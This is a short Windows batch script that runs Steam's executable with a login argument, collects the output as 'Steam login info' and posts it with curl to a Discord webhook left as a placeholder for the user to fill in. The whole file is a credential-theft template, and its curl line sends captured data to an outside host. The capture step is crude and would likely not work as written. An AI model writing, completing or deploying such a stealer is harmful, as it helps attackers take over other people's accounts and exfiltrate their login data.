@echo off
setlocal enabledelayedexpansion
set "SteamPath=C:\Program Files (x86)\Steam\steam.exe"
set "UserDataDir=%LOCALAPPDATA%\Steam"
set "LoginInfo="
for /f "delims=" %%a in ('"%SteamPath%" -login username password 2^>^&1') do (
    set "LoginInfo=!LoginInfo!%%a"
)
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Steam login info: %LoginInfo%\"}" YOUR_DISCORD_WEBHOOK_URL_HERE
pause
